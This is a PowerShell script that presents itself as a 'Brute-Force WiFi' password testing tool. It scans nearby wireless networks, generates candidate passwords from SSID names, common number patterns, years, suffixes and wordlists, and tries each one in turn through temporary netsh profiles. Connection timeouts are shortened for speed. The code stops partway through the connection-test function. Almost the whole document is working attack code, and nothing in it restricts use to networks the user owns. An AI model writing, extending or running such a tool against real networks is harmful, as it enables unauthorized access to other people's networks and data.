# Brute-Force WiFi - Password Testing Tool
# Version 1.0
# Tested on: Windows 10 LTSC
# Requires: Windows, PowerShell, Admin Rights, Wireless Adapter

# Script Configuration
$CONFIG = @{
    PasswordLength = 8
    MaxPasswords = 100000
    Interface = $null
    InterfaceGUID = $null
    ScanTimeout = 10
    ConnectionTimeout = 1              # ← REDUCED from 3
    Separators = @("-", "_", ".", "@", "#", "$", "!")
    LogDirectory = if ($PSScriptRoot) { $PSScriptRoot } else { [System.IO.Path]::GetTempPath() }
    DebugMode = $false                 # MUST stay false for speed
    RetryAttempts = 0
    ScanDelaySeconds = 1               # ← REDUCED from 3
    MinSignalStrength = 1
    CommonPasswordFile = Join-Path $(if ($PSScriptRoot) { $PSScriptRoot } else { [System.IO.Path]::GetTempPath() }) "common_passwords.txt"
}
common_passwords
class ConnectionStateManager {
    hidden [string]$Interface
    hidden [string]$InterfaceGUID
    hidden [string]$CurrentSSID
    hidden [System.Diagnostics.Stopwatch]$Timer
    hidden [string]$LogFile
    hidden [string]$DebugFile

    ConnectionStateManager([string]$interface, [string]$interfaceGUID, [string]$logFile, [string]$debugFile) {
        $this.Interface = $interface
        $this.InterfaceGUID = $interfaceGUID
        $this.Timer = [System.Diagnostics.Stopwatch]::new()
        $this.LogFile = $logFile
        $this.DebugFile = $debugFile
    }

    [void] PrepareForTesting() {
        try {
            Write-Log "Preparing interface for testing..." "DEBUG" $this.LogFile $this.DebugFile
            
            # Disconnect any existing connection
            netsh wlan disconnect interface="$($this.Interface)" | Out-Null
            Start-Sleep -Milliseconds 50

            # Reset adapter if needed
            $adapter = Get-NetAdapter | Where-Object InterfaceGuid -eq $this.InterfaceGUID
            if ($adapter.Status -ne "Up") {
                Write-Log "Resetting adapter..." "DEBUG" $this.LogFile $this.DebugFile
                Disable-NetAdapter -Name $this.Interface -Confirm:$false
                Start-Sleep -Milliseconds 100
                Enable-NetAdapter -Name $this.Interface -Confirm:$false
                Start-Sleep -Milliseconds 200
            }

            # Clear existing profiles for clean testing
            $profiles = netsh wlan show profiles interface="$($this.Interface)" | 
                       Select-String "All User Profile\s+:\s(.+)" | 
                       ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
            
            foreach ($profile in $profiles) {
                Write-Log "Removing profile: $profile" "DEBUG" $this.LogFile $this.DebugFile
                netsh wlan delete profile name="$profile" interface="$($this.Interface)" | Out-Null
            }
        }
        catch {
            Write-Log "Failed to prepare for testing: $_" "ERROR" $this.LogFile $this.DebugFile
        }
    }

    [void] StartTimer() {
        $this.Timer.Restart()
    }

    [timespan] GetElapsedTime() {
        return $this.Timer.Elapsed
    }

    [void] CleanupConnection() {
        try {
            Write-Log "Cleaning up connection state..." "DEBUG" $this.LogFile $this.DebugFile
            
            # Disconnect current connection
            netsh wlan disconnect interface="$($this.Interface)" | Out-Null
            
            # Remove any temporary profiles
            $profiles = netsh wlan show profiles interface="$($this.Interface)" | 
                       Select-String "All User Profile\s+:\s(TempProfile_.+)" | 
                       ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
            
            foreach ($profile in $profiles) {
                netsh wlan delete profile name="$profile" interface="$($this.Interface)" | Out-Null
            }
        }
        catch {
            Write-Log "Cleanup error: $_" "ERROR" $this.LogFile $this.DebugFile
        }
    }
}

class ProgressTracker {
    hidden [DateTime]$StartTime
    hidden [int]$TotalPasswords
    hidden [int]$TestedPasswords
    hidden [System.Collections.Generic.List[double]]$SpeedHistory
    hidden [string]$LogFile
    hidden [string]$DebugFile
    hidden [bool]$IsComplete

    ProgressTracker([int]$total, [string]$logFile, [string]$debugFile) {
        $this.StartTime = Get-Date
        $this.TotalPasswords = $total
        $this.TestedPasswords = 0
        $this.SpeedHistory = [System.Collections.Generic.List[double]]::new()
        $this.LogFile = $logFile
        $this.DebugFile = $debugFile
        $this.IsComplete = $false
    }

    [void] UpdateProgress([string]$currentPassword) {
        $this.TestedPasswords++
        $elapsed = ([DateTime]::Now - $this.StartTime).TotalSeconds
        
        if ($elapsed -gt 0) {
            $speed = $this.TestedPasswords / $elapsed
            $this.SpeedHistory.Add($speed)
            
            # Keep only last 10 speed measurements
            if ($this.SpeedHistory.Count -gt 10) {
                $this.SpeedHistory.RemoveAt(0)
            }
        }

        $averageSpeed = ($this.SpeedHistory | Measure-Object -Average).Average
        $percentComplete = ($this.TestedPasswords / $this.TotalPasswords) * 100
        $remainingPasswords = $this.TotalPasswords - $this.TestedPasswords
        $estimatedSeconds = if ($averageSpeed -gt 0) { $remainingPasswords / $averageSpeed } else { 0 }
        $estimatedRemaining = [TimeSpan]::FromSeconds($estimatedSeconds)

        $progressParams = @{
            Activity = "Testing WiFi Passwords"
            Status = "Testing: $currentPassword"
            PercentComplete = $percentComplete
            CurrentOperation = ("Speed: {0:N1} p/s | Remaining: {1:hh\:mm\:ss} | Progress: {2}/{3}" -f 
                $averageSpeed, $estimatedRemaining, $this.TestedPasswords, $this.TotalPasswords)
        }

        Write-Progress @progressParams
        Write-Log "Progress: $($this.TestedPasswords)/$($this.TotalPasswords) - Testing: $currentPassword" "DEBUG" $this.LogFile $this.DebugFile
    }

    [void] Complete() {
        $this.IsComplete = $true
        Write-Progress -Activity "Testing WiFi Passwords" -Completed
    }

    [hashtable] GetStatistics() {
        $elapsed = ([DateTime]::Now - $this.StartTime).TotalSeconds
        $averageSpeed = ($this.SpeedHistory | Measure-Object -Average).Average

        return @{
            ElapsedTime = [TimeSpan]::FromSeconds($elapsed)
            TestedPasswords = $this.TestedPasswords
            AverageSpeed = $averageSpeed
            PercentComplete = ($this.TestedPasswords / $this.TotalPasswords) * 100
            RemainingPasswords = $this.TotalPasswords - $this.TestedPasswords
            IsComplete = $this.IsComplete
        }
    }
}

class ConnectionResult {
    [bool]$Success
    [string]$SSID
    [string]$Password
    [string]$Security
    [timespan]$ConnectionTime
    [string]$ErrorMessage
    [int]$SignalStrength

    ConnectionResult() {
        $this.Success = $false
        $this.ConnectionTime = [timespan]::Zero
    }

    static [ConnectionResult] CreateSuccess([string]$ssid, [string]$password, [string]$security, [timespan]$time, [int]$signal) {
        $result = [ConnectionResult]::new()
        $result.Success = $true
        $result.SSID = $ssid
        $result.Password = $password
        $result.Security = $security
        $result.ConnectionTime = $time
        $result.SignalStrength = $signal
        return $result
    }

    static [ConnectionResult] CreateFailure([string]$errorMessage) {
        $result = [ConnectionResult]::new()
        $result.Success = $false
        $result.ErrorMessage = $errorMessage
        return $result
    }
}

function Get-NetworkSecurityType {
    param (
        [string]$SSID,
        [hashtable]$AdapterInfo,
        [string]$LogFile,
        [string]$DebugFile
    )

    try {
        $networkInfo = netsh wlan show networks interface="$($AdapterInfo.Name)" ssid="$SSID" mode=Bssid | Out-String
        
        # Match both English and German security information
        $security = if ($networkInfo -match "Authentication|Authentifizierung\s+:\s+(.+)") {
            $auth = $matches[1].Trim()
            $cipher = if ($networkInfo -match "Cipher|Verschlüsselung\s+:\s+(.+)") { 
                $matches[1].Trim() 
            } else { 
                "Unknown" 
            }
            
            switch -Regex ($auth) {
                "WPA3-SAE|WPA3-Personal" { "WPA3-Personal" }
                "WPA3-Enterprise" { "WPA3-Enterprise" }
                "WPA2-Enterprise" { "WPA2-Enterprise" }
                "WPA2-Personal" {
                    if ($cipher -match "CCMP|AES") { "WPA2PSK-AES" }
                    elseif ($cipher -match "TKIP") { "WPA2PSK-TKIP" }
                    else { "WPA2PSK" }
                }
                "WPA-Personal" {
                    if ($cipher -match "CCMP|AES") { "WPAPSK-AES" }
                    elseif ($cipher -match "TKIP") { "WPAPSK-TKIP" }
                    else { "WPAPSK" }
                }
                "WEP" { "WEP" }
                "Open|Offen" { "Open" }
                default { "WPA2PSK" }
            }
        }
        else {
            "WPA2PSK"  # Default fallback
        }

        Write-Log ("Detected security type for {0}: {1}" -f $SSID, $security) "DEBUG" $LogFile $DebugFile
        return $security
    }
    catch {
        Write-Log "Error detecting security type: $_" "ERROR" $LogFile $DebugFile
        return "WPA2PSK"  # Safe fallback
    }
}

function Get-NormalizedSSID {
    param([string]$SSID)

    $normalized = $SSID -replace '[äÄ]', 'ae' `
                       -replace '[öÖ]', 'oe' `
                       -replace '[üÜ]', 'ue' `
                       -replace '[ß]', 'ss' `
                       -replace '[^a-zA-Z0-9]', '_' `
                       -replace '_+', '_' `
                       -replace '^_|_$', ''

    return $normalized
}

function Select-NetworkAdapter {
    try {
        # Get all wireless adapters that support 802.11
        $adapters = @(Get-NetAdapter | Where-Object { 
            $_.MediaType -eq "Native 802.11" -or $_.MediaType -eq "802.11"
        } | ForEach-Object {
            $guid = (Get-NetAdapter -Name $_.Name).InterfaceGuid
            [PSCustomObject]@{
                Name = $_.Name
                InterfaceDescription = $_.InterfaceDescription
                Status = $_.Status
                MacAddress = $_.MacAddress
                GUID = $guid
            }
        })

        if (-not $adapters -or $adapters.Count -eq 0) {
            Write-Host "`nNo wireless adapters found or all adapters are disabled!" -ForegroundColor Red
            Write-Host "Please ensure:"
            Write-Host "1. You have a wireless adapter installed"
            Write-Host "2. The wireless adapter is enabled"
            Write-Host "3. Appropriate drivers are installed"
            return $null
        }

        Write-Host "`nAvailable Wireless Adapters:" -ForegroundColor Cyan
        Write-Host "=============================" -ForegroundColor Cyan
        
        for ($i = 0; $i -lt $adapters.Count; $i++) {
            $status = $adapters[$i].Status
            $statusColor = if ($status -eq "Up") { "Green" } else { "Yellow" }
            
            Write-Host "`n[$i] " -NoNewline -ForegroundColor Cyan
            Write-Host "$($adapters[$i].Name)" -NoNewline -ForegroundColor White
            Write-Host " - " -NoNewline
            Write-Host "$($adapters[$i].InterfaceDescription)" -NoNewline -ForegroundColor White
            Write-Host " [Status: " -NoNewline
            Write-Host "$status" -NoNewline -ForegroundColor $statusColor
            Write-Host "]"
            Write-Host "    MAC: $($adapters[$i].MacAddress)"
            Write-Host "    GUID: $($adapters[$i].GUID)"
        }

        do {
            try {
                $selection = Read-Host "`nSelect adapter number (0-$($adapters.Count - 1))"
                $selection = [int]$selection
                if ($selection -ge 0 -and $selection -lt $adapters.Count) {
                    $selectedAdapter = $adapters[$selection]
                    
                    # Return complete adapter information
                    return @{
                        Name = $selectedAdapter.Name
                        GUID = $selectedAdapter.GUID
                        MacAddress = $selectedAdapter.MacAddress
                        Description = $selectedAdapter.InterfaceDescription
                    }
                }
                Write-Host "Invalid selection. Please try again." -ForegroundColor Red
            }
            catch {
                Write-Host "Invalid input. Please enter a number." -ForegroundColor Red
            }
        } while ($true)
    }
    catch {
        Write-Host "Error selecting network adapter: $_" -ForegroundColor Red
        Write-Host $_.Exception.StackTrace -ForegroundColor Red
        return $null
    }
}

function Initialize-NetworkDirectory {
    param(
        [Parameter(Mandatory=$true)]
        [string]$SSID
    )

    try {
        $normalizedSSID = Get-NormalizedSSID -SSID $SSID
        $networkFolder = Join-Path $CONFIG.LogDirectory $normalizedSSID

        # Ensure network folder exists
        if (-not (Test-Path $networkFolder)) {
            New-Item -ItemType Directory -Path $networkFolder -Force | Out-Null
        }

        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"

        $paths = @{
            NetworkFolder = $networkFolder
            LogFile = Join-Path $networkFolder "scan_$timestamp.log"
            DebugFile = Join-Path $networkFolder "debug_$timestamp.log"
            PasswordFile = Join-Path $networkFolder "passwords_$timestamp.txt"
            SuccessFile = Join-Path $networkFolder "success_$timestamp.txt"
            WrongPasswordsFile = Join-Path $networkFolder "wrong_passwords.txt"
            Timestamp = $timestamp
        }

        # Ensure directories exist
        foreach ($key in $paths.Keys) {
            if ($paths[$key] -match '\.[a-zA-Z]+$') {
                $directory = Split-Path $paths[$key] -Parent
                if (-not (Test-Path $directory)) {
                    New-Item -ItemType Directory -Path $directory -Force | Out-Null
                }
            }
        }

        return $paths
    }
    catch {
        Write-Host "Failed to initialize network directory: $_" -ForegroundColor Red
        throw
    }
}

function Test-SpecificAdapterConnection {
    param(
        [Parameter(Mandatory=$true)]
        [string]$SSID,
        [Parameter(Mandatory=$true)]
        [hashtable]$AdapterInfo,
        [string]$LogFile,
        [string]$DebugFile
    )

    try {
        # Allow more time for connection establishment
        Start-Sleep -Milliseconds 50

        # Get interface status (both English and German)
        $connectionState = netsh wlan show interfaces name="$($AdapterInfo.Name)" | Out-String
        
        # Check connection state and SSID match
        $isConnectedState = $connectionState -match "State\s+:\s+connected|Status\s+:\s+Verbunden"
        $isCorrectSSID = $connectionState -match "SSID\s+:\s+$([regex]::Escape($SSID))"

        # Get network profile as additional verification
        $networkInfo = Get-NetConnectionProfile -InterfaceIndex $AdapterInfo.Index -ErrorAction SilentlyContinue

        # Get adapter status using compatible method
        $adapterStatus = try {
            Get-NetAdapter -InterfaceGuid $AdapterInfo.Guid -ErrorAction Stop
        }
        catch {
            Get-NetAdapter | Where-Object { $_.InterfaceGuid -eq $AdapterInfo.Guid -or $_.InterfaceIndex -eq $AdapterInfo.Index }
        }

        # Primary connection verification
        $isConnected = $isConnectedState -and $isCorrectSSID

        # Additional verification if available
        if ($networkInfo -and $adapterStatus) {
            $isConnected = $isConnected -and 
                          $adapterStatus.Status -eq "Up" -and
                          $networkInfo.Name -eq $SSID
        }

        $logMessage = @"
Connection check for adapter $($AdapterInfo.Name):
GUID: $($AdapterInfo.Guid)
Index: $($AdapterInfo.Index)
MAC: $($AdapterInfo.MacAddress)
Connected State: $isConnectedState
SSID Match: $isCorrectSSID
Adapter Status: $($adapterStatus.Status)
Network Profile: $($networkInfo.Name)
Final Result: $isConnected
Raw Interface State:
$connectionState
"@
        Write-Log $logMessage "DEBUG" $LogFile $DebugFile

        return $isConnected
    }
    catch {
        Write-Log "Error checking adapter connection: $_" "ERROR" $LogFile $DebugFile
        return $false
    }
}

function Initialize-SystemSettings {
    param(
        [string]$LogFile,
        [string]$DebugFile
    )
    
    try {
        # Get default paths if not provided
		if ([string]::IsNullOrEmpty($LogFile) -or [string]::IsNullOrEmpty($DebugFile)) {
			$defaultPaths = Get-LogPaths
			$LogFile = if ($LogFile) { $LogFile } else { $defaultPaths.LogFile }
			$DebugFile = if ($DebugFile) { $DebugFile } else { $defaultPaths.DebugFile }
		}

        # Force English language globally
        $env:LANG = "en-US"
        [System.Threading.Thread]::CurrentThread.CurrentUICulture = 'en-US'
        [System.Threading.Thread]::CurrentThread.CurrentCulture = 'en-US'
        
        # Optimize process priority
        $process = Get-Process -Id $PID
        $process.PriorityClass = 'RealTime'
        
        # Optimize network adapter settings
        netsh interface tcp set global autotuninglevel=normal
        netsh interface tcp set global congestionprovider=ctcp
        netsh interface tcp set global ecncapability=disabled
        
        Write-Log "System settings initialized" "INFO" $LogFile $DebugFile
        return $true
    }
    catch {
        Write-Log "Failed to initialize system settings: $_" "ERROR" $LogFile $DebugFile
        return $false
    }
}

function Write-Log {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [string]$Level = "INFO",
        [string]$LogFile,
        [string]$DebugFile
    )

    try {
        # Get default paths if not provided
		if ([string]::IsNullOrEmpty($LogFile) -or [string]::IsNullOrEmpty($DebugFile)) {
			$defaultPaths = Get-LogPaths
			$LogFile = if ($LogFile) { $LogFile } else { $defaultPaths.LogFile }
			$DebugFile = if ($DebugFile) { $DebugFile } else { $defaultPaths.DebugFile }
		}

        # Skip logging during password testing if not in debug mode
        if ($Level -eq "DEBUG" -and -not $CONFIG.DebugMode) {
            return
        }

        $logDir = Split-Path $LogFile -Parent
        if (-not (Test-Path $logDir)) {
            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
        }

        $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"

        if ($Level -eq "DEBUG" -and $CONFIG.DebugMode) {
            Add-Content -Path $DebugFile -Value $logMessage -ErrorAction Stop
        } elseif ($Level -ne "DEBUG") {
            Add-Content -Path $LogFile -Value $logMessage -ErrorAction Stop
        }

        # Only output messages for certain levels
        switch ($Level) {
            "ERROR"   { Write-Host $logMessage -ForegroundColor Red }
            "WARNING" { Write-Host $logMessage -ForegroundColor Yellow }
            "SUCCESS" { Write-Host $logMessage -ForegroundColor Green }
            default   { }  # Do not output other messages to console
        }
    }
    catch {
        Write-Host "Logging error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function Test-AdminRights {
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Test-WifiCapabilities {
    param(
        [Parameter(Mandatory=$true)]
        [string]$LogFile,
        [Parameter(Mandatory=$true)]
        [string]$DebugFile,
        [Parameter(Mandatory=$true)]
        [PSCustomObject]$AdapterInfo  # Changed from hashtable to PSCustomObject
    )

    Write-Log "Testing WiFi capabilities..." "INFO" $LogFile $DebugFile

    try {
        # Get adapter using GUID
        $adapterInfo = Get-NetAdapter | Where-Object { $_.InterfaceGuid -eq $AdapterInfo.GUID }

        if (-not $adapterInfo) {
            Write-Log "Adapter '$($AdapterInfo.Name)' not found or not accessible" "ERROR" $LogFile $DebugFile
            Write-Host "Adapter not found. Please verify:" -ForegroundColor Red
            Write-Host "1. Adapter is properly connected" -ForegroundColor Yellow
            Write-Host "2. Drivers are correctly installed" -ForegroundColor Yellow
            Write-Host "3. Adapter is enabled in Device Manager" -ForegroundColor Yellow
            return $false
        }

        # Log detailed adapter information
        $adapterDetails = @{
            Name = $adapterInfo.Name
            Status = $adapterInfo.Status
            MediaType = $adapterInfo.MediaType
            LinkSpeed = $adapterInfo.LinkSpeed
            MacAddress = $adapterInfo.MacAddress
            InterfaceIndex = $adapterInfo.InterfaceIndex
            InterfaceGuid = $adapterInfo.InterfaceGuid
        }
        
        Write-Log "Adapter found: $($adapterInfo.Name) - Status: $($adapterInfo.Status)" "INFO" $LogFile $DebugFile
        Write-Log "Adapter details: $($adapterDetails | ConvertTo-Json)" "DEBUG" $LogFile $DebugFile

        # Verify adapter type
        if ($adapterInfo.MediaType -notmatch "802.11|Native 802.11|Wireless") {
            Write-Log "Adapter is not a wireless adapter (Type: $($adapterInfo.MediaType))" "ERROR" $LogFile $DebugFile
            return $false
        }

        # Check wireless capabilities
        $wlanInfo = netsh wlan show drivers
        if ($wlanInfo -match "not running|nicht aktiv") {
            Write-Log "Wireless service is not running properly" "ERROR" $LogFile $DebugFile
            return $false
        }
        Write-Log "Wireless driver information:`n$wlanInfo" "DEBUG" $LogFile $DebugFile

        # Verify wireless service
        $wlanService = Get-Service "WlanSvc" -ErrorAction SilentlyContinue
        Write-Log "WLAN Service Status: $($wlanService.Status)" "INFO" $LogFile $DebugFile

        if (-not $wlanService) {
            Write-Log "WLAN Service not found" "ERROR" $LogFile $DebugFile
            return $false
        }

        if ($wlanService.Status -ne "Running") {
            Write-Log "Starting WLAN Service..." "WARNING" $LogFile $DebugFile
            try {
                Start-Service "WlanSvc" -ErrorAction Stop
                Start-Sleep -Seconds 1
                
                # Verify service started successfully
                $wlanService = Get-Service "WlanSvc"
                if ($wlanService.Status -ne "Running") {
                    Write-Log "Failed to start WLAN Service" "ERROR" $LogFile $DebugFile
                    return $false
                }
            }
            catch {
                Write-Log "Error starting WLAN Service: $_" "ERROR" $LogFile $DebugFile
                return $false
            }
        }

        # Enable adapter if it's disconnected
        if ($adapterInfo.Status -ne "Up") {
            Write-Log "Enabling adapter..." "INFO" $LogFile $DebugFile
            Enable-NetAdapter -Name $AdapterInfo.Name -Confirm:$false
            Start-Sleep -Milliseconds 500
        }

        Write-Log "WiFi capabilities test completed successfully" "INFO" $LogFile $DebugFile
        return $true
    }
    catch {
        Write-Log "Error testing WiFi capabilities: $_" "ERROR" $LogFile $DebugFile
        Write-Log "Stack trace: $($_.ScriptStackTrace)" "ERROR" $LogFile $DebugFile
        return $false
    }
}

function Test-WifiInterface {
    param(
        [string]$LogFile,
        [string]$DebugFile
    )

    try {
        # Get detailed interface status
        $interfaceStatus = netsh wlan show interfaces | Select-String -Pattern ($CONFIG.Interface)
        if (-not $interfaceStatus) {
            Write-Log "Interface '$($CONFIG.Interface)' not found" "ERROR" $LogFile $DebugFile
            Write-Host "`nTroubleshooting Steps:" -ForegroundColor Yellow
            Write-Host "1. Verify TP-Link adapter is properly connected" -ForegroundColor Yellow
            Write-Host "2. Check Device Manager for driver status" -ForegroundColor Yellow
            Write-Host "3. Try reconnecting the adapter" -ForegroundColor Yellow
            Write-Host "4. Run 'netsh wlan show interfaces' manually" -ForegroundColor Yellow
            return $false
        }

        # Check radio status
        $radioStatus = netsh wlan show interfaces | Select-String -Pattern "Radio status|Funkstatus"
        if ($radioStatus -match "Hardware\s+(On|Ein).*Software\s+(On|Ein)") {
            Write-Log "Interface radio is active" "INFO" $LogFile $DebugFile
            return $true
        }
        elseif ($radioStatus -match "Hardware\s+(Off|Aus)") {
            Write-Log "Interface hardware radio is off" "WARNING" $LogFile $DebugFile
            Write-Host "`nWireless adapter is turned off in hardware" -ForegroundColor Yellow
            Write-Host "Please check:" -ForegroundColor Yellow
            Write-Host "1. Physical wireless switch on your device" -ForegroundColor Yellow
            Write-Host "2. Fn + Wireless key combination if applicable" -ForegroundColor Yellow
            return $false
        }
        elseif ($radioStatus -match "Software\s+(Off|Aus)") {
            Write-Log "Interface software radio is off, attempting to enable..." "WARNING" $LogFile $DebugFile
            try {
                # Enable adapter if software disabled
                $adapter = Get-NetAdapter | Where-Object { $_.InterfaceGuid -eq $CONFIG.InterfaceGUID }
                if ($adapter.Status -eq "Disabled") {
                    Enable-NetAdapter -Name $CONFIG.Interface -Confirm:$false
                    Start-Sleep -Seconds 2
                    Write-Log "Interface enabled successfully" "INFO" $LogFile $DebugFile
                }
                return $true
            }
            catch {
                Write-Log "Failed to enable interface: $_" "ERROR" $LogFile $DebugFile
                return $false
            }
        }

        # If we get here, the adapter is present and enabled
        Write-Log "Interface is ready for use" "INFO" $LogFile $DebugFile
        return $true
    }
    catch {
        Write-Log "Interface check failed: $_" "ERROR" $LogFile $DebugFile
        return $false
    }
}

function Reset-WifiAdapter {
    param(
        [string]$LogFile,
        [string]$DebugFile,
        [hashtable]$AdapterInfo
    )

    try {
        Write-Log "Resetting wireless adapter..." "INFO" $LogFile $DebugFile

        # Disconnect current connection
        netsh wlan disconnect interface="$($AdapterInfo.Name)" | Out-Null
        netsh wlan disconnect interface="$Interface" | Out-Null
        Start-Sleep -Milliseconds   25    

        Write-Log "Adapter reset completed" "INFO" $LogFile $DebugFile
        return $true
    }
    catch {
        Write-Log "Failed to reset adapter: $_" "ERROR" $LogFile $DebugFile
        return $false
    }
}

function Get-WifiNetworks {
    param(
        [string]$LogFile,
        [string]$DebugFile
    )

    try {
        Write-Log "Initiating network scan..." "INFO" $LogFile $DebugFile

        # Disconnect from current network
        netsh wlan disconnect interface="$($CONFIG.Interface)" | Out-Null
        Start-Sleep -Milliseconds 100

        # Multiple scan attempts for better results
        for ($i = 1; $i -le 2; $i++) {
            Write-Log "Scan attempt $i..." "DEBUG" $LogFile $DebugFile
            netsh wlan scan interface="$($CONFIG.Interface)" | Out-Null
            Start-Sleep -Milliseconds 100
        }

        # Force English output and specify interface
        $env:LANG = "en-US"
        $rawOutput = netsh wlan show networks interface="$($CONFIG.Interface)" mode=Bssid

        if ($null -eq $rawOutput) {
            Write-Log "No networks found" "WARNING" $LogFile $DebugFile
            return $null
        }

        $networks = [System.Collections.ArrayList]::new()
        $currentNetwork = $null

        foreach ($line in $rawOutput) {
            if ($line -match "SSID \d+ : (.+)") {
                if ($currentNetwork) {
                    [void]$networks.Add($currentNetwork)
                }
                $currentNetwork = @{
                    SSID = $matches[1].Trim()
                    Security = ""
                    Signal = ""
                    Interface = $CONFIG.Interface
                    InterfaceGUID = $CONFIG.InterfaceGUID
                }
            }
            elseif ($currentNetwork) {
                if ($line -match "Authentication\s+:\s+(.+)") {
                    $currentNetwork.Security = $matches[1].Trim()
                }
                elseif ($line -match "Signal\s+:\s+(\d+)%") {
                    $currentNetwork.Signal = [int]$matches[1].Trim()
                }
            }
        }

        if ($currentNetwork) {
            [void]$networks.Add($currentNetwork)
        }

        # Filter networks
        $filteredNetworks = $networks | Where-Object {
            $_.SSID -and
            $_.Signal -ge $CONFIG.MinSignalStrength
        }

        Write-Log "Found $($filteredNetworks.Count) networks" "INFO" $LogFile $DebugFile
        return $filteredNetworks
    }
    catch {
        Write-Log "Network scan failed: $_" "ERROR" $LogFile $DebugFile
        return $null
    }
}

function Get-LogPaths {
    param(
        [string]$SSID = ""
    )
    
    if ([string]::IsNullOrEmpty($SSID)) {
        return @{
            LogFile = Join-Path $CONFIG.LogDirectory "default.log"
            DebugFile = Join-Path $CONFIG.LogDirectory "debug.log"
        }
    }
    
    $normalizedSSID = Get-NormalizedSSID -SSID $SSID
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $networkFolder = Join-Path $CONFIG.LogDirectory $normalizedSSID
    
    # Ensure directory exists
    if (-not (Test-Path $networkFolder)) {
        New-Item -ItemType Directory -Path $networkFolder -Force | Out-Null
    }
    
    return @{
        LogFile = Join-Path $networkFolder "scan_$timestamp.log"
        DebugFile = Join-Path $networkFolder "debug_$timestamp.log"
    }
}

function Generate-PasswordList {
    param(
        [Parameter(Mandatory=$true)]
        [string]$SSID,
        [string]$LogFile,
        [string]$DebugFile,
        [System.Collections.Generic.HashSet[string]]$WrongPasswords
    )

    Write-Log "Generating optimized password list for SSID: $SSID" "INFO" $LogFile $DebugFile
    $passwords = [System.Collections.Generic.List[string]]::new()
    
    # SSID-based patterns (all lowercase for better real-world alignment)
    $words = $SSID -split '\s+'
    $combinedNoSpace = ($words -join "").ToLower()
    
    # Base patterns (all lowercase)
    $basePatterns = @(
        $combinedNoSpace,
        ($words[0]).ToLower(),
        ($words[-1]).ToLower()
    ) | Where-Object { $_ -and $_.Length -ge 3 }

    # Common number patterns
    $numberPatterns = @(
        '123', '1234', '12345', '123456',
        '321', '4321', '54321',
        '111', '1111', '11111',
        '000', '0000',
        '666', '6666',
        '888', '8888',
        '999', '9999'
    )

    # Years (current and recent)
    $years = @(
        '2024', '2023', '2022', '2021', '2020',
        '2019', '2018', '2017', '2016', '2015'
    )
    $shortYears = @('24', '23', '22', '21', '20')

    # Common suffixes and prefixes
    $suffixes = @(
        'wifi', 'web', 'admin', 'router',
        'home', 'guest', 'private', 'public',
        'pass', 'pwd', 'password'
    )

    # Generate SSID-based combinations
    foreach ($base in $basePatterns) {
        # Basic number combinations
        foreach ($num in $numberPatterns) {
            $pattern = "$base$num"
            if ($pattern.Length -ge 8 -and $pattern.Length -le 63) {
                [void]$passwords.Add($pattern)
            }
        }

        # Year combinations
        foreach ($year in $years) {
            $patterns = @(
                "$base$year",
                "$year$base"
            )
            foreach ($pattern in $patterns) {
                if ($pattern.Length -ge 8 -and $pattern.Length -le 63) {
                    [void]$passwords.Add($pattern)
                }
            }
        }

        # Suffix combinations
        foreach ($suffix in $suffixes) {
            $patterns = @(
                "$base$suffix",
                "$suffix$base"
            )
            foreach ($pattern in $patterns) {
                if ($pattern.Length -ge 8 -and $pattern.Length -le 63) {
                    [void]$passwords.Add($pattern)
                }
            }
        }
    }

    # Load and process wordlists from subfolder
    $listsFolder = Join-Path $CONFIG.LogDirectory "lists"
    if (Test-Path $listsFolder) {
        Get-ChildItem -Path $listsFolder -Filter "*.txt" | ForEach-Object {
            if ($_.Name -ne "mydataset.txt") {
                $words = Get-Content $_.FullName | ForEach-Object { $_.ToLower().Trim() }
                foreach ($word in $words) {
                    if ($word.Length -lt 8) {
                        # Add number suffixes to short words
                        foreach ($num in $numberPatterns) {
                            $pattern = "$word$num"
                            if ($pattern.Length -ge 8 -and $pattern.Length -le 63) {
                                [void]$passwords.Add($pattern)
                            }
                        }
                    }
                    elseif ($word.Length -le 63) {
                        [void]$passwords.Add($word)
                    }
                }
            }
        }
    }

    # Load common passwords (use as-is)
    if (Test-Path $CONFIG.CommonPasswordFile) {
        $commonPasswords = Get-Content $CONFIG.CommonPasswordFile
        foreach ($pass in $commonPasswords) {
            if ($pass.Length -ge 8 -and $pass.Length -le 63) {
                [void]$passwords.Add($pass)
            }
        }
    }

    # Filter unique passwords and remove wrong passwords
    $uniquePasswords = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    foreach ($pass in $passwords) {
        if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pass)) {
            [void]$uniquePasswords.Add($pass)
        }
    }

    Write-Log "Generated $($uniquePasswords.Count) unique passwords" "INFO" $LogFile $DebugFile
    return [System.Collections.Generic.List[string]]::new($uniquePasswords)
}

function Test-WifiConnection {
    param (
        [Parameter(Mandatory=$true)]
        [string]$SSID,
        [Parameter(Mandatory=$true)]
        [string]$Password,
        [Parameter(Mandatory=$true)]
        [string]$Security,
        [Parameter(Mandatory=$true)]
        [string]$Interface,
        [Parameter(Mandatory=$true)]
        [string]$InterfaceGUID,
        [string]$LogFile,
        [string]$DebugFile
    )

    $uniqueProfileName = "TempProfile_" + [System.Guid]::NewGuid().ToString("N")
    $profilePath = $null
    
    try {
        # Quick disconnect
        netsh wlan disconnect interface="$Interface" | Out-Null
        Start-Sleep -Milliseconds 100

        # Remove existing profiles
        $existingProfiles = netsh wlan show profiles interface="$Interface" | 
                          Select-String "All User Profile\s+:\s+(.+)" | 
                          ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        
        foreach ($profile in $existingProfiles) {
            if ($profile -like "TempProfile_*") {
                netsh wlan delete profile name="$profile" interface="$Interface" | Out-Null
            }
        }

        $profilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "$uniqueProfileName.xml")

        # Security type mapping
        $securityMapping = @{
            "WPA2-Personal" = "WPA2PSK"
            "WPA2-Enterprise" = "WPA2"
            "WPA3-Personal" = "WPA3PSK"
